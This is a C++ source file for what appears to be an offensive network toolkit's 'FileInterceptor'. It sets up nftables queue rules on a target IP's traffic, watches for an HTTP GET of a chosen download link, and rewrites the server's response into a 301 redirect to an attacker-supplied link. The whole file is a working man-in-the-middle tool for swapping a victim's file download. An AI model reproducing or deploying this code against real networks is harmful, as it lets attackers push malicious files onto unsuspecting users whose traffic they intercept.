#include "FileInterceptor.h"

#include <iostream>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <poll.h>
#include <cstring>

static bool32 FilterTCPReq(const char* downloadLink, tcphdr* tcpHeader, char* payload, uint32_t& reqAckNum)
{
    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
    if(res == PC_HTTP_REQUEST)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_GET)
        {
            char packetFileName[255]{};
            char packetDomainName[255]{};
            char packetDownloadLink[1024]{};

            char buffer[255]{};

            // Copy the first line of the http request in buffer. Should be something like this: "GET /test/file.php HTTP/1.1"
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload, '\n');

            int filePathStartIndex = 4;
            int filePathEndIndex = PacketCraft::FindInStr(buffer, " HTTP");
            memcpy(packetFileName, buffer + filePathStartIndex, filePathEndIndex - filePathStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetFileName[filePathEndIndex] = '\0';

            // Copy the line containing the host domain name in buffer. Should be something like this: "Host: example.test.com"
            // TODO: Host may be written in capital letters! Need to add support for that!
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload + PacketCraft::FindInStr(payload, "Host: "), '\n');

            int domainStartIndex = 6;
            int domainEndIndex = PacketCraft::FindInStr(buffer, "\r\n");
            memcpy(packetDomainName, buffer + domainStartIndex, domainEndIndex - domainStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetDomainName[domainEndIndex] = '\0';

            PacketCraft::ConcatStr(packetDownloadLink, sizeof(packetDownloadLink), packetDomainName, packetFileName);

            if(PacketCraft::CompareStr(packetDownloadLink, downloadLink) == TRUE)
            {
                reqAckNum = tcpHeader->ack_seq;
                return TRUE;
            }
        }
    }
    return FALSE;
}

static bool32 FilterTCPRes(tcphdr* tcpHeader, char* payload, uint32_t requestAckNum)
{
    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
    if(res == PC_HTTP_RESPONSE)
    {
        res = PacketCraft::GetHTTPMethod((uint8_t*)payload);
        if(res == PC_HTTP_SUCCESS || PC_HTTP_REDIR)
        {
            if(tcpHeader->seq == requestAckNum)
                return TRUE;
        }
    }
    return FALSE;
}

static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buff* pkBuff, uint32_t matchOffset, uint32_t matchLen)
{
    // create new payload
    char* httpResponse = (char*)malloc(matchLen);
    memset(httpResponse, 0, matchLen);
    const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
    uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
    PacketCraft::ConcatStr(httpResponse, responseCodeLen, httpStatusCode, newDownloadLink);
    //////////

    if(ipVersion == AF_INET)
    {
        // NOTE: is the final argument (rep_size) correct? When trying to use the httpResponse string length it will
        // give a segmentation fault..
        if(nfq_tcp_mangle_ipv4(pkBuff, matchOffset, matchLen, httpResponse, matchLen) < 0)
        {
            free(httpResponse);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
            return APPLICATION_ERROR;
        }
    }
    else
    {
        if(nfq_tcp_mangle_ipv6(pkBuff, matchOffset, matchLen, httpResponse, responseCodeLen) < 0)
        {
            free(httpResponse);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
            return APPLICATION_ERROR;
        }
    }

    free(httpResponse);
    return NO_ERROR;
}

 static int nfq_send_verdict(int queue_num, uint32_t id, mnl_socket* nl, pkt_buff* pkBuff)
 {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    nlmsghdr* nlh;
    nlattr* nest;

    nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);

    if(pktb_mangled(pkBuff))
    {
        std::cout << "packet was mangled" << std::endl;
        nfq_nlmsg_verdict_put_pkt(nlh, pktb_data(pkBuff), pktb_len(pkBuff));
    }

    nfq_nlmsg_verdict_put(nlh, id, NF_ACCEPT);

    /* example to set the connmark. First, start NFQA_CT section: */
    nest = mnl_attr_nest_start(nlh, NFQA_CT);

    /* then, add the connmark attribute: */
    mnl_attr_put_u32(nlh, CTA_MARK, htonl(42));
    /* more conntrack attributes, e.g. CTA_LABELS could be set here */

    /* end conntrack section */
    mnl_attr_nest_end(nlh, nest);

    if(mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0) 
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }

    return NO_ERROR;
 }

bool32 reqFiltered{FALSE};
uint32_t reqAckNum{0};
static int queueCallback(const nlmsghdr *nlh, void *data)
{
    std::cout << "--------------------\n";
    nfqnl_msg_packet_hdr* ph{nullptr};
    nlattr* attr[NFQA_MAX + 1]{};
    nfgenmsg*nfg{nullptr};

    CHaks::NetFilterCallbackData callbackData = *(CHaks::NetFilterCallbackData*)data;

    if(nfq_nlmsg_parse(nlh, attr) < 0) 
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_parse() error");
        return MNL_CB_ERROR;
    }

    nfg = (nfgenmsg*)mnl_nlmsg_get_payload(nlh);
    if(nfg == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_nlmsg_get_payload() error");
        return MNL_CB_ERROR;
    }

    if(attr[NFQA_PACKET_HDR] == NULL) 
    {
        LOG_ERROR(APPLICATION_ERROR, "metaheader not set");
        return MNL_CB_ERROR;
    }

    ph = (nfqnl_msg_packet_hdr*)mnl_attr_get_payload(attr[NFQA_PACKET_HDR]);
    if(ph == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_attr_get_payload() NFQA_PACKET_HDR error");
        return MNL_CB_ERROR;
    }

    uint16_t plen{0};
    uint8_t* payload{nullptr};

    plen = mnl_attr_get_payload_len(attr[NFQA_PAYLOAD]);
    payload = (uint8_t*)mnl_attr_get_payload(attr[NFQA_PAYLOAD]);
    if(payload == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_attr_get_payload() NFQA_PAYLOAD error");
        return MNL_CB_ERROR;
    }

    printf("packet received (id=%u hw=0x%04x hook=%u, payload len %u\n", ntohl(ph->packet_id), ntohs(ph->hw_protocol), ph->hook, plen);

    uint32_t ipVersion{};
    if(ntohs(ph->hw_protocol) == ETH_P_IP)
        ipVersion = AF_INET;
    else if(ntohs(ph->hw_protocol) == ETH_P_IPV6)
        ipVersion = AF_INET6;

    pkt_buff* pkBuff = pktb_alloc(ipVersion, payload, plen, 4'096);
    if(pkBuff == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "pktb_alloc() error");
        return MNL_CB_ERROR;
    }

    iphdr* ipv4Header{nullptr};
    ip6_hdr* ipv6Header{nullptr};
    tcphdr* tcpHeader{nullptr};

    if(ipVersion == AF_INET)
    {
        ipv4Header = nfq_ip_get_hdr(pkBuff);
        if(ipv4Header == nullptr)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "pktb_network_header() error");
            return MNL_CB_ERROR;
        }

        if(nfq_ip_set_transport_header(pkBuff, ipv4Header) < 0)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_set_transport_header() error");
            return MNL_CB_ERROR;
        }

        if(ipv4Header->protocol == IPPROTO_TCP)
        {
            // make sure that the packet IPs matches with the desired target IP
            if(reqFiltered == FALSE)
            {
                sockaddr_in targetAddr{};
                inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
                if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
                {
                    std::cout << "ip did not match\n";
                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                    {
                        pktb_free(pkBuff);
                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
                        return MNL_CB_ERROR;
                    }
                    return MNL_CB_OK;
                }
            }
            else
            {
                sockaddr_in targetAddr{};
                inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
                if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
                {
                    std::cout << "ip did not match\n";
                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                    {
                        pktb_free(pkBuff);
                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
                        return MNL_CB_ERROR;
                    }
                    return MNL_CB_OK;
                }
            }
            //////////////////////////
        }
        else // no TCP layer in packet
        {
            std::cout << "no tcp header in packet\n";
            if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
            {
                pktb_free(pkBuff);
                LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
                return MNL_CB_ERROR;
            }
            return MNL_CB_OK;
        }
    }
    else if(ipVersion == AF_INET6)
    {
        ipv6Header = nfq_ip6_get_hdr(pkBuff);
        if(ipv6Header == nullptr)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_get_hdr()");
            return MNL_CB_ERROR;
        }

        int res = nfq_ip6_set_transport_header(pkBuff, ipv6Header, IPPROTO_TCP);
        if(res == 1)
        {
            // make sure that the packet IPs matches with the desired target IP
            if(reqFiltered == FALSE)
            {
                sockaddr_in6 targetAddr{};
                inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
                if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                {
                    std::cout << "ip6 did not match\n";
                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                    {
                        pktb_free(pkBuff);
                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
                        return MNL_CB_ERROR;
                    }
                    return MNL_CB_OK;
                }
            }
            else
            {
                sockaddr_in6 targetAddr{};
                inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);  
                if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                {
                    std::cout << "ip6 did not match\n";
                    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                    {
                        pktb_free(pkBuff);
                        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
                        return MNL_CB_ERROR;
                    }
                    return MNL_CB_OK;
                }
            }
            //////////
        }
        else if(res < 0) // no TCP layer in packet
        {
            std::cout << "no tcp header found in packet\n";
            if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
            {
                pktb_free(pkBuff);
                LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
                return MNL_CB_ERROR;
            }
            return MNL_CB_OK;
        }
    }

    tcpHeader = nfq_tcp_get_hdr(pkBuff);
    if(tcpHeader == nullptr)
    {
        pktb_free(pkBuff);
        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_hdr");
        return MNL_CB_ERROR;
    }

    void *tcpPayload = nfq_tcp_get_payload(tcpHeader, pkBuff);
    if(tcpPayload == nullptr)
    {
        pktb_free(pkBuff);
        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_payload() error");
        return MNL_CB_ERROR;
    }

    unsigned int tcpPayloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
    
    if(reqFiltered == FALSE) // filter for the correct request and get its ack number
    {
        std::cout << "filtering request...\n";
        if(FilterTCPReq(callbackData.downloadLink, tcpHeader, (char*)tcpPayload, reqAckNum) == TRUE)
        {
            std::cout << "matching request filtered, id: " << ntohl(ph->packet_id) << "\n";
            reqFiltered = TRUE;
        }
    }
    else // filter for the correct response. the seq num must match the request ack num
    {
        std::cout << "filtering response...\n";
        if(FilterTCPRes(tcpHeader, (char*)tcpPayload, reqAckNum) == TRUE)
        {
            std::cout << "matching response filtered, id: " << ntohl(ph->packet_id) << "\n";

            char printBuf[1024]{};

            std::cout << printBuf << "\n-----------" << std::endl;
            nfq_ip_snprintf(printBuf, 1024, ipv4Header);
            std::cout << "ip before mangling:\n";
            std::cout << printBuf << "\n-----------" << std::endl;

            memset(printBuf, 0, 1024);

            nfq_tcp_snprintf(printBuf, 1024, tcpHeader);
            std::cout << "tcp before mangling:\n";
            std::cout << printBuf << "\n-----------" << std::endl;

            std::cout << "tcp payload len was " << tcpPayloadLen << std::endl;

            if(ManglePacket(ipVersion, callbackData.newDownloadLink, pkBuff, 4 * tcpHeader->th_off, tcpPayloadLen) == APPLICATION_ERROR)
            {
                pktb_free(pkBuff);
                reqFiltered = FALSE;
                reqAckNum = 0;
                LOG_ERROR(APPLICATION_ERROR, "ManglePacket() error");
                return MNL_CB_ERROR;
            }

            std::cout << printBuf << "\n-----------" << std::endl;
            nfq_ip_snprintf(printBuf, 1024, ipv4Header);
            std::cout << "ip after mangling:\n";
            std::cout << printBuf << "\n-----------" << std::endl;

            memset(printBuf, 0, 1024);

            nfq_tcp_snprintf(printBuf, 1024, tcpHeader);
            std::cout << "tcp after mangling:\n";
            std::cout << printBuf << "\n-----------" << std::endl;

            reqFiltered = FALSE;
            reqAckNum = 0;
        }
    }

    if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_send_verdict() error");
        return MNL_CB_ERROR;
    }

    return MNL_CB_OK;
}

CHaks::FileInterceptor::FileInterceptor() :
    requestAckNum(0),
    requestFiltered(FALSE),
    ipVersion(0),
    queueNum(0),
    handler(nullptr),
    queue(nullptr)
{

}

CHaks::FileInterceptor::~FileInterceptor()
{
    char cmd[CMD_LEN]{};

    snprintf(cmd, CMD_LEN, "nft flush table %s %s",  ipVersion == AF_INET ? "ip" : "ip6", tableName);
    system(cmd);

    memset(cmd, 0, CMD_LEN);

    snprintf(cmd, CMD_LEN, "nft delete table %s %s",  ipVersion == AF_INET ? "ip" : "ip6", tableName);
    system(cmd);

    if(queue != nullptr)
        nfq_destroy_queue(queue);

    if(handler != nullptr)
        nfq_close(handler);
}

int CHaks::FileInterceptor::Init(const uint32_t ipVersion, const char* interfaceName, const char* targetIP, const char* downloadLink, const char* newDownloadLink,
    int queueNum)
{
    this->ipVersion = ipVersion; // TODO: obsolete because ip is now passed in callbackData. remove when ready
    this->queueNum = queueNum;

    callbackData.ipVersion = ipVersion;
    PacketCraft::CopyStr(callbackData.targetIPStr, INET6_ADDRSTRLEN, targetIP);
    PacketCraft::CopyStr(callbackData.downloadLink, DOWNLOAD_LINK_STR_SIZE, downloadLink);
    PacketCraft::CopyStr(callbackData.newDownloadLink, DOWNLOAD_LINK_STR_SIZE, newDownloadLink);
    PacketCraft::CopyStr(callbackData.interfaceName, IFNAMSIZ, interfaceName);

    char cmd[CMD_LEN]{};

    snprintf(cmd, CMD_LEN, "nft add table %s %s", ipVersion == AF_INET ? "ip" : "ip6", tableName);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to create nft table");
        return APPLICATION_ERROR;
    }
    memset(cmd, 0, CMD_LEN);

    // Add chain 1(postrouting) and rules to it
    snprintf(cmd, CMD_LEN, "nft \'add chain %s %s %s { type filter hook postrouting priority 0 ; }\'", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain1Name);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add chain1");
        return APPLICATION_ERROR;
    }
    memset(cmd, 0, CMD_LEN);

    snprintf(cmd, CMD_LEN, "nft add rule %s %s %s meta l4proto tcp", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain1Name);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add meta rules in chain");
        return APPLICATION_ERROR;
    }
    memset(cmd, 0, CMD_LEN);

    snprintf(cmd, CMD_LEN, "nft add rule %s %s %s queue num %d", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain1Name, queueNum);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add queue rule in chain");
        return APPLICATION_ERROR;
    }
    //////////////////////////////////////

/*
    // Add chain 2(prerouting) and rules to it
    snprintf(cmd, CMD_LEN, "nft \'add chain %s %s %s { type filter hook output priority 0 ; }\'", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain2Name);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add chain1");
        return APPLICATION_ERROR;
    }
    memset(cmd, 0, CMD_LEN);

    snprintf(cmd, CMD_LEN, "nft add rule %s %s %s meta l4proto tcp", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain2Name);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add meta rules in chain");
        return APPLICATION_ERROR;
    }
    memset(cmd, 0, CMD_LEN);

    snprintf(cmd, CMD_LEN, "nft add rule %s %s %s queue num %d", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain2Name, queueNum);
    if(system(cmd) != 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add queue rule in chain");
        return APPLICATION_ERROR;
    }
    //////////////////////////////////////
*/

    std::cout << "chains created:\n";
    system("nft list ruleset");

    return NO_ERROR;
}

int CHaks::FileInterceptor::Run()
{
    char* buffer{nullptr};
    nlmsghdr* nlh{nullptr};
    /* largest possible packet payload, plus netlink data overhead: */
    size_t bufferSize = 0xffff + (MNL_SOCKET_BUFFER_SIZE/2);
    int res;

    callbackData.nl = mnl_socket_open(NETLINK_NETFILTER);
    if(callbackData.nl == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_open() error");
        return APPLICATION_ERROR;
    }

    if(mnl_socket_bind(callbackData.nl, 0, MNL_SOCKET_AUTOPID) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_bind() error");
        return APPLICATION_ERROR;
    }

    portId = mnl_socket_get_portid(callbackData.nl);

    buffer = (char*)malloc(bufferSize);
    if(!buffer) 
    {
        mnl_socket_close(callbackData.nl);
        LOG_ERROR(APPLICATION_ERROR, "malloc() error");
        return APPLICATION_ERROR;
    }

    nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
    if(nlh == nullptr)
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
        return APPLICATION_ERROR;
    }

    nfq_nlmsg_cfg_put_cmd(nlh, ipVersion, NFQNL_CFG_CMD_BIND);

    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }
 
    nlh = nfq_nlmsg_put(buffer, NFQNL_MSG_CONFIG, queueNum);
    if(nlh == nullptr)
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "nfq_nlmsg_put() error");
        return APPLICATION_ERROR;
    }

    nfq_nlmsg_cfg_put_params(nlh, NFQNL_COPY_PACKET, IP_MAXPACKET);
    mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(NFQA_CFG_F_GSO));
    mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(NFQA_CFG_F_GSO));

    if(mnl_socket_sendto(callbackData.nl, nlh, nlh->nlmsg_len) < 0) 
    {
        mnl_socket_close(callbackData.nl);
        free(buffer);
        LOG_ERROR(APPLICATION_ERROR, "mnl_socket_sendto() error");
        return APPLICATION_ERROR;
    }

    /* ENOBUFS is signalled to userspace when packets were lost
    * on kernel side.  In most cases, userspace isn't interested
    * in this information, so turn it off.
    */
    res = 1;
    mnl_socket_setsockopt(callbackData.nl, NETLINK_NO_ENOBUFS, &res, sizeof(int));

    pollfd pollFds[2]{-1, -1};
    pollFds[0].fd = 0;
    pollFds[0].events = POLLIN;
    pollFds[1].fd = mnl_socket_get_fd(callbackData.nl);
    pollFds[1].events = POLLIN;

    while(true)
    {
        int nEvents = poll(pollFds, sizeof(pollFds) / sizeof(pollFds[0]), -1);
        if(nEvents == -1)
        {
            mnl_socket_close(callbackData.nl);
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "poll() error");
            return APPLICATION_ERROR;
        }
        else if(pollFds[1].revents & POLLIN) // we have a packet in the queue
        {
            res = mnl_socket_recvfrom(callbackData.nl, buffer, bufferSize);
            if (res == -1) 
            {
                mnl_socket_close(callbackData.nl);
                free(buffer);
                LOG_ERROR(APPLICATION_ERROR, "mnl_socket_recvfrom() error");
                return APPLICATION_ERROR;
            }

            res = mnl_cb_run(buffer, res, 0, portId, queueCallback, &callbackData);
            if (res < 0)
            {
                mnl_socket_close(callbackData.nl);
                free(buffer);
                LOG_ERROR(APPLICATION_ERROR, "mnl_cb_run() error");
                return APPLICATION_ERROR;
            }
        }
        else if(pollFds[0].revents & POLLIN) // user hit a key and wants to quit program
        {
            break;
        }
        else
        {
            mnl_socket_close(callbackData.nl);
            free(buffer);
            LOG_ERROR(APPLICATION_ERROR, "unknown poll() error!");
            return APPLICATION_ERROR;
        }

    }

    mnl_socket_close(callbackData.nl);
    free(buffer);
    return NO_ERROR;
}